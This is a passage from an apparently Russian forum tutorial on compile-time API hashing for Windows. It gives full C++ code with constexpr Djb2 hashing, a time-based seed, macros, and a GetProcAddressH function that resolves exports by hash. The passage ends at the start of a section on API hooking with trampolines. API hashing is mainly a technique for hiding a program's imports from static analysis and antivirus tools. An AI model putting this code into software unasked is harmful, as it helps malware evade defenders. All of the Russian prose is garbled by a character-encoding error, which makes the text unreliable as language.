–ø—Ä–∏ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –¥–≤–æ–∏—á–Ω–æ–≥–æ —Ñ–∞–π–ª–∞.<br />
<br />
<b>–û–≥–æ–≤–æ—Ä–∫–∞</b><br />
<br />
–≠—Ç–æ—Ç –º–µ—Ç–æ–¥ —Ä–∞–±–æ—Ç–∞–µ—Ç —Ç–æ–ª—å–∫–æ —Å –ø—Ä–æ–µ–∫—Ç–∞–º–∏ –Ω–∞ C++ –∏–∑-–∑–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –∫–ª—é—á–µ–≤–æ–≥–æ —Å–ª–æ–≤–∞ constexpr. –û–ø–µ—Ä–∞—Ç–æ—Ä constexpr –≤ C++ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —É–∫–∞–∑–∞–Ω–∏—è –Ω–∞ —Ç–æ, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è –∏–ª–∏ –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è –º–æ–∂–µ—Ç –±—ã—Ç—å –≤—ã—á–∏—Å–ª–µ–Ω–∞ –Ω–∞ —ç—Ç–∞–ø–µ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –æ–ø–µ—Ä–∞—Ç–æ—Ä constexpr –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—è—Ö –∏ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö —É–ª—É—á—à–∞–µ—Ç –ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –ø–æ–∑–≤–æ–ª—è—è –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä—É –≤—ã–ø–æ–ª–Ω—è—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ –≤—ã—á–∏—Å–ª–µ–Ω–∏—è –Ω–∞ —ç—Ç–∞–ø–µ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏, –∞ –Ω–µ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
<b>–ü–æ—à–∞–≥–æ–≤–æ–µ —Ä—É–∫–æ–≤–æ–¥—Å—Ç–≤–æ –ø–æ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—é –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏</b><br />
<br />
–ù–∏–∂–µ –ø—Ä–∏–≤–µ–¥–µ–Ω—ã —à–∞–≥–∏, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–ª—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏.<br />
<br />
<b>–°–æ–∑–¥–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–π –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ </b><br />
<br />
–ü–µ—Ä–≤—ã–º —à–∞–≥–æ–º —è–≤–ª—è–µ—Ç—Å—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏–µ –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö —Ö–µ—à-—Ñ—É–Ω–∫—Ü–∏–π –≤ —Ñ—É–Ω–∫—Ü–∏–∏, –≤—ã–ø–æ–ª–Ω—è–µ–º—ã–µ –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏, —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ constexpr. –í –¥–∞–Ω–Ω–æ–º —Å–ª—É—á–∞–µ –∞–ª–≥–æ—Ä–∏—Ç–º —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è Dbj2 –±—É–¥–µ—Ç –∏–∑–º–µ–Ω–µ–Ω –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –æ–ø–µ—Ä–∞—Ç–æ—Ä–∞ constexpr.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define SEED 5 // –§—É–Ω–∫—Ü–∏—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è Djb2 –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ (WIDE)
constexpr DWORD HashStringDjb2W(const wchar_t* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash &lt;&lt; SEED) + Hash) + c;
    }

    return Hash;
}

// –§—É–Ω–∫—Ü–∏—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è Djb2 –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ (ASCII)
constexpr DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash &lt;&lt; SEED) + Hash) + c;
    }

    return Hash;
}</code></pre>
	</div>
</div><br />
–ù–µ–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è, g_KEY, –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –≤ –∫–∞—á–µ—Å—Ç–≤–µ –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —Ö–µ—à–∞ –≤ –æ–±–µ–∏—Ö —Ñ—É–Ω–∫—Ü–∏—è—Ö.<br />
<br />
g_KEY - —ç—Ç–æ –≥–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è constexpr –∏ –æ–Ω–∞ —Å–ª—É—á–∞–π–Ω—ã–º –æ–±—Ä–∞–∑–æ–º –≥–µ–Ω–µ—Ä–∏—Ä—É–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏–µ–π RandomCompileTimeSeed (–æ–±—ä—è—Å–Ω—è–µ—Ç—Å—è –Ω–∏–∂–µ) –ø—Ä–∏ –∫–∞–∂–¥–æ–π –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –¥–≤–æ–∏—á–Ω–æ–≥–æ —Ñ–∞–π–ª–∞.<br />
<br />
–ì–µ–Ω–µ—Ä–∞—Ü–∏—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —á–∏—Å–ª–∞ RandomCompileTimeSeed –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å–ª—É—á–∞–π–Ω–æ–≥–æ –∑–Ω–∞—á–µ–Ω–∏—è –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —á–∏—Å–ª–∞ –Ω–∞ –æ—Å–Ω–æ–≤–µ —Ç–µ–∫—É—â–µ–≥–æ –≤—Ä–µ–º–µ–Ω–∏. –û–Ω –¥–µ–ª–∞–µ—Ç —ç—Ç–æ, –∏–∑–≤–ª–µ–∫–∞—è —Ü–∏—Ñ—Ä—ã –∏–∑ –º–∞–∫—Ä–æ—Å–∞ TIME, –∫–æ—Ç–æ—Ä—ã–π —è–≤–ª—è–µ—Ç—Å—è –ø—Ä–µ–¥–æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–º –º–∞–∫—Ä–æ—Å–æ–º –≤ C++, –∫–æ—Ç–æ—Ä—ã–π —Ä–∞—Å—à–∏—Ä—è–µ—Ç—Å—è –¥–æ —Ç–µ–∫—É—â–µ–≥–æ –≤—Ä–µ–º–µ–Ω–∏ –≤ —Ñ–æ—Ä–º–∞—Ç–µ –ß–ß:–ú–ú:–°–°. –ó–∞—Ç–µ–º —Ñ—É–Ω–∫—Ü–∏—è RandomCompileTimeSeed —É–º–Ω–æ–∂–∞–µ—Ç –∫–∞–∂–¥—É—é —Ü–∏—Ñ—Ä—É –Ω–∞ —Ä–∞–∑–Ω—É—é —Å–ª—É—á–∞–π–Ω—É—é –∫–æ–Ω—Å—Ç–∞–Ω—Ç—É –∏ —Å–∫–ª–∞–¥—ã–≤–∞–µ—Ç –∏—Ö –≤—Å–µ –≤–º–µ—Å—Ç–µ, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —á–∏—Å–ª–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ì–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —Å–ª—É—á–∞–π–Ω—ã–π –∫–ª—é—á –Ω–∞ —ç—Ç–∞–ø–µ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∫–∞–∫ –Ω–∞—á–∞–ª—å–Ω—ã–π —Ö–µ—à
constexpr int RandomCompileTimeSeed(void)
{
    return &#039;0&#039; * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

// –ö–æ–º–ø–∏–ª–∏—Ä—É–µ–º–æ–µ –≤—Ä–µ–º—è —Å–ª—É—á–∞–π–Ω–æ–≥–æ –Ω–∞—á–∞–ª—å–Ω–æ–≥–æ —á–∏—Å–ª–∞
constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;</code></pre>
	</div>
</div><br />
<b>–°–æ–∑–¥–∞–Ω–∏–µ –º–∞–∫—Ä–æ—Å–æ–≤</b><br />
<br />
–ó–∞—Ç–µ–º –æ–ø—Ä–µ–¥–µ–ª–∏—Ç–µ –¥–≤–∞ –º–∞–∫—Ä–æ—Å–∞, RTIME_HASHA –∏ RTIME_HASHW, –∫–æ—Ç–æ—Ä—ã–µ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —Ñ—É–Ω–∫—Ü–∏–µ–π GetProcAddressH –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –¥–ª—è —Å—Ä–∞–≤–Ω–µ–Ω–∏—è —Ö–µ—à–µ–π. –ú–∞–∫—Ä–æ—Å—ã —Å–ª–µ–¥—É–µ—Ç –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º.<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)       // –í—ã–∑–æ–≤ HashStringDjb2A
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)    // –í—ã–∑–æ–≤ HashStringDjb2W</code></pre>
	</div>
</div><br />
–ö–∞–∫ —Ç–æ–ª—å–∫–æ —Ñ—É–Ω–∫—Ü–∏—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –±—É–¥–µ—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞, —Å–ª–µ–¥—É—é—â–∏–º —à–∞–≥–æ–º –±—É–¥–µ—Ç –æ–±—ä—è–≤–ª–µ–Ω–∏–µ –∑–Ω–∞—á–µ–Ω–∏–π —Ö–µ—à–∞ –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö. –î–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ –±—É–¥—É—Ç —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω—ã –¥–≤–∞ –º–∞–∫—Ä–æ—Å–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringDjb2A((const char*) #API);
#define CTIME_HASHW( API ) constexpr auto API##_Rotr32W = HashStringDjb2W((const wchar_t*) L#API);</code></pre>
	</div>
</div><br />
<b>–û–ø–µ—Ä–∞—Ç–æ—Ä –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –≤ —Å—Ç—Ä–æ–∫—É</b><br />
<br />
–°–∏–º–≤–æ–ª # –∏–∑–≤–µ—Å—Ç–µ–Ω –∫–∞–∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –≤ —Å—Ç—Ä–æ–∫—É. –û–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –º–∞–∫—Ä–æ–ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞ –≤ —Å—Ç—Ä–æ–∫–æ–≤—ã–π –ª–∏—Ç–µ—Ä–∞–ª.<br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ –º–∞–∫—Ä–æ—Å CTIME_HASHA –≤—ã–∑–≤–∞–Ω —Å –∞—Ä–≥—É–º–µ–Ω—Ç–æ–º SomeFunction, –∫–∞–∫ HASHA(SomeFunction), –≤—ã—Ä–∞–∂–µ–Ω–∏–µ #API –±—É–¥–µ—Ç –∑–∞–º–µ–Ω–µ–Ω–æ —Å—Ç—Ä–æ–∫–æ–≤—ã–º –ª–∏—Ç–µ—Ä–∞–ª–æ–º &quot;SomeFunction&quot;.<br />
<br />
<b>–û–ø–µ—Ä–∞—Ç–æ—Ä –æ–±—ä–µ–¥–∏–Ω–µ–Ω–∏—è</b><br />
<br />
–û–ø–µ—Ä–∞—Ç–æ—Ä ## –∏–∑–≤–µ—Å—Ç–µ–Ω –∫–∞–∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä –æ–±—ä–µ–¥–∏–Ω–µ–Ω–∏—è. –û–Ω –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–±—ä–µ–¥–∏–Ω–µ–Ω–∏—è –¥–≤—É—Ö –º–∞–∫—Ä–æ—Å–æ–≤ –≤ –æ–¥–∏–Ω –º–∞–∫—Ä–æ—Å.<br />
–û–ø–µ—Ä–∞—Ç–æ—Ä ## –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–±—ä–µ–¥–∏–Ω–µ–Ω–∏—è –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ API —Å–æ —Å—Ç—Ä–æ–∫–æ–π &quot;_Rotr32A&quot; –∏–ª–∏ &quot;_Rotr32W&quot; —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ, —á—Ç–æ–±—ã —Ñ–æ—Ä–º–∏—Ä–æ–≤–∞—Ç—å –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω–æ–µ –∏–º—è –æ–ø—Ä–µ–¥–µ–ª—è–µ–º–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π.<br />
<br />
–ù–∞–ø—Ä–∏–º–µ—Ä, –µ—Å–ª–∏ –º–∞–∫—Ä–æ—Å CTIME_HASHA –≤—ã–∑–≤–∞–Ω —Å –∞—Ä–≥—É–º–µ–Ω—Ç–æ–º SomeFunction, –∫–∞–∫ HASHA(SomeFunction), –æ–ø–µ—Ä–∞—Ç–æ—Ä ## –æ–±—ä–µ–¥–∏–Ω–∏—Ç API —Å &quot;_Rotr32A&quot; –¥–ª—è —Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏—è –æ–∫–æ–Ω—á–∞—Ç–µ–ª—å–Ω–æ–≥–æ –∏–º–µ–Ω–∏ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π SomeFunction_Rotr32A.<br />
<br />
<b>–î–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏—è —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è –º–∞–∫—Ä–æ—Å–∞ </b><br />
<br />
–ß—Ç–æ–±—ã –ª—É—á—à–µ –ø–æ–Ω—è—Ç—å, –∫–∞–∫ —Ä–∞–±–æ—Ç–∞—é—Ç –ø—Ä–µ–¥—ã–¥—É—â–∏–µ –º–∞–∫—Ä–æ—Å—ã, –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –Ω–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω –ø—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –º–∞–∫—Ä–æ—Å–∞ CTIME_HASHA –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ö–µ—à–∞ –¥–ª—è MessageBoxA, —Å–æ–∑–¥–∞–≤–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é –ø–æ–¥ –Ω–∞–∑–≤–∞–Ω–∏–µ–º MessageBoxA_Rotr32A, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç —Å–æ–¥–µ—Ä–∂–∞—Ç—å –∑–Ω–∞—á–µ–Ω–∏–µ —Ö–µ—à–∞ –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784966961.png"
		data-src="https://osint42.org/attachments/1746784966961-png.189/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784966961-png.189/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784966961.png"
			title="1746784966961.png"
			width="1205" height="145" loading="lazy" />
	</div><br />
<br />
<b>–•–µ—à–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ - –ö–æ–¥</b><br />
<br />
–°–æ–±—Ä–∞–≤ –≤—Å–µ –≤–º–µ—Å—Ç–µ, –∫–æ–¥ –±—É–¥–µ—Ç –≤—ã–≥–ª—è–¥–µ—Ç—å —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;winternl.h&gt;
#define SEED 5 // –≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞—Ç—å —Å–ª—É—á–∞–π–Ω—ã–π –∫–ª—é—á (–∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∫–∞–∫ –Ω–∞—á–∞–ª—å–Ω—ã–π —Ö–µ—à)
constexpr int RandomCompileTimeSeed(void)
{
    return &#039;0&#039; * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};

constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;

// –§—É–Ω–∫—Ü–∏—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è Djb2 –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ (WIDE)
constexpr DWORD HashStringDjb2W(const wchar_t* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash &lt;&lt; SEED) + Hash) + c;
    }

    return Hash;
}

// –§—É–Ω–∫—Ü–∏—è —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è Djb2 –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ (ASCII)
constexpr DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash &lt;&lt; SEED) + Hash) + c;
    }

    return Hash;
}

// –º–∞–∫—Ä–æ—Å—ã —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)
// –º–∞–∫—Ä–æ—Å—ã —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è –≤–æ –≤—Ä–µ–º—è –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ (–∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö)
#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A = HashStringDjb2A((const char*) #API);
#define CTIME_HASHW( API ) constexpr auto API##_Rotr32W = HashStringDjb2W((const wchar_t*) L#API);

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {

    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);
    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;

    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);

    for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (dwApiNameHash == RTIME_HASHA(pFunctionName)) { // –ø—Ä–æ–≤–µ—Ä–∫–∞ –∑–Ω–∞—á–µ–Ω–∏—è —Ö–µ—à–∞ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è
            return (FARPROC)pFunctionAddress;
        }
    }

    return NULL;
}</code></pre>
	</div>
</div><br />
<b>–î–µ–º–æ</b><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746784976541.png"
		data-src="https://osint42.org/attachments/1746784976541-png.190/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746784976541-png.190/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746784976541.png"
			title="1746784976541.png"
			width="1558" height="312" loading="lazy" />
	</div></div>
						

							<h2>–ö—É–Ω–≥—Ñ—É-2.–ò–∑—É—á–∞–µ–º API Hooking</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746785165779.png"
		data-src="https://osint42.org/attachments/1746785165779-png.191/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785165779-png.191/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785165779.png"
			title="1746785165779.png"
			width="1000" height="667" loading="lazy" />
	</div><br />
<br />
<b>–í–≤–µ–¥–µ–Ω–∏–µ </b><br />
<br />
API Hooking ‚Äî —ç—Ç–æ —Ç–µ—Ö–Ω–∏–∫–∞, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è –ø–æ–≤–µ–¥–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ API. –û–Ω–∞ —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏, –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –ø—Ä–æ–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∏ –≤–∑–ª–æ–º–∞ –∏–≥—Ä.<br />
API Hooking –ø–æ–∑–≤–æ–ª—è–µ—Ç –∑–∞–º–µ–Ω—è—Ç—å –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—É—é —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é —Ñ—É–Ω–∫—Ü–∏–∏ API —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ–π –≤–µ—Ä—Å–∏–µ–π, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–ø–æ–ª–Ω—è–µ—Ç –Ω–µ–∫–æ—Ç–æ—Ä—ã–µ –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–µ–π—Å—Ç–≤–∏—è –¥–æ –∏–ª–∏ –ø–æ—Å–ª–µ –≤—ã–∑–æ–≤–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∏–∑–º–µ–Ω—è—Ç—å –ø–æ–≤–µ–¥–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –±–µ–∑ –∏–∑–º–µ–Ω–µ–Ω–∏—è –µ—ë –∏—Å—Ö–æ–¥–Ω–æ–≥–æ –∫–æ–¥–∞.<br />
<br />
<b>–¢—Ä–∞–º–ø–ª–∏–Ω—ã</b><br />
<br />
–ö–ª–∞—Å—Å–∏—á–µ—Å–∫–∏–π —Å–ø–æ—Å–æ–± —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ API-—Ö—É–∫–æ–≤ –æ—Å—É—â–µ—Å—Ç–≤–ª—è–µ—Ç—Å—è —Å –ø–æ–º–æ—â—å—é —Ç—Ä–∞–º–ø–ª–∏–Ω–æ–≤.<br />
